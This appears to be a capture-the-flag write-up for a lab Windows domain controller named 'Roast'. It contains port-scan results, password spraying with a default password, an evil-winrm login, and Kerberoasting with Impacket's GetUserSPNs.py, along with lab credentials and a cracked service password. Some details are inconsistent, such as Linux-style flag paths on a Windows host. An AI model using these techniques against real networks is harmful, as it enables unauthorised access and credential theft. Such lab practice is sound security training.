# Roast

**IP Address:** 172.31.3.2

## Enumeration
### Open Ports
| Port | State | Service | Version |
|------|-------|---------|---------|
| 135/tcp | open | msrpc | Microsoft Windows RPC  |
| 139/tcp | open | netbios-ssn | Microsoft Windows netbios-ssn  |
| 3268/tcp | open | ldap | Microsoft Windows Active Directory LDAP  |
| 3269/tcp | open | tcpwrapped |   |
| 3389/tcp | open | ms-wbt-server | Microsoft Terminal Services  |
| 389/tcp | open | ldap | Microsoft Windows Active Directory LDAP  |
| 445/tcp | open | microsoft-ds |   |
| 464/tcp | open | kpasswd5 |   |
| 49666/tcp | open | msrpc | Microsoft Windows RPC  |
| 49669/tcp | open | msrpc | Microsoft Windows RPC  |
| 49672/tcp | open | ncacn_http | Microsoft Windows RPC over HTTP 1.0 |
| 49673/tcp | open | msrpc | Microsoft Windows RPC  |
| 49677/tcp | open | msrpc | Microsoft Windows RPC  |
| 49698/tcp | open | msrpc | Microsoft Windows RPC  |
| 49753/tcp | open | msrpc | Microsoft Windows RPC  |
| 53/tcp | open | domain | Simple DNS Plus  |
| 593/tcp | open | ncacn_http | Microsoft Windows RPC over HTTP 1.0 |
| 5985/tcp | open | http | Microsoft HTTPAPI httpd 2.0 |
| 636/tcp | open | tcpwrapped |   |
| 88/tcp | open | kerberos-sec | Microsoft Windows Kerberos  |
| 9389/tcp | open | mc-nmf | .NET Message Framing  |
| 123/udp | open | ntp | NTP v3 |
| 137/udp | open | netbios-ns | Microsoft Windows netbios-ns  |
| 53/udp | open | domain |   |

## Exploitation
### Exploit Details (Found Credentials)
* **Name** - Found Credentials
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A

Enumeration of Active Directory lists 3 user accounts. One of these user accounts has the description showing a default value for a password. Although this password does not work with this user account it could be a default value used on all accounts. So we try it against other accounts and get a valid login. 


dsmith / WelcomeToR04st
crhodes 
ssmith

evil-winrm -i $ip -u crhodes -p WelcomeToR04st


Commands
```
whoami
cat /var/www/local.txt
```

![Execute Exploit](images/exploit1.png)

## Privilege Escalation
### Exploit Details ()
* **Name** - 
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A

GetUserSPNs.py roast.csl/crhodes:WelcomeToR04st -dc-ip $ip -request

roastsvc
!!!watermelon245
!!!watermelon245

python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip $ip roast.csl/crhodes -outputfile hashes



Commands
```bash
whoami
cat /root/proof.txt
```
![Execute Exploit](images/privesc1.png)

## Loot
```
local.txt

proof.txt

```